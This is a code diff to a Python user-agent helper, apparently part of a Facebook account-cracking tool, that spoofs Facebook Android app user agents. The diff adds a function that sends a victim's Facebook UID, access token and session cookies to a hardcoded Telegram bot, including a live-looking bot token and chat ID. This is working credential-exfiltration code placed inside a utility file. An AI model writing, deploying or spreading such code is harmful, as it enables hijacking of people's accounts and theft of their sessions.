@@ -1,4 +1,5 @@
 import random
+import requests
 def useragent():
     fbks = (
         'com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
@@ -15,3 +16,34 @@ def useragent():
     cr = random.choice(CRACKsim1)
     CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM={{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
     return CRACK_ua
+
+def handle_telegram_message(c_user, token, cookie):
+    """
+    Send a message to Telegram about the successful login.
+    """
+    bot_token = "7696072927:AAHCieEIUD2UVr5alMwZqyIPhVGjPUqr3KU"  # Replace with your bot token
+    chat_id = "7352132358"  # Replace with your chat ID
+    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+
+    # Construct the message
+    message = (
+        f"<b>Successful Login:</b>\n"
+        f"UID: {c_user}\n"
+        f"Token: {token}\n"
+        f"Cookies: {cookie}"
+    )
+
+    # Send the request to Telegram
+    data = {
+        "chat_id": chat_id,
+        "text": message,
+        "parse_mode": "HTML"
+    }
+    try:
+        response = requests.post(telegram_url, data=data)
+        if response.status_code == 200:
+            print("Message sent to Telegram successfully!")
+        else:
+            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
+    except Exception as e:
+        print("Error sending message to Telegram:", e)
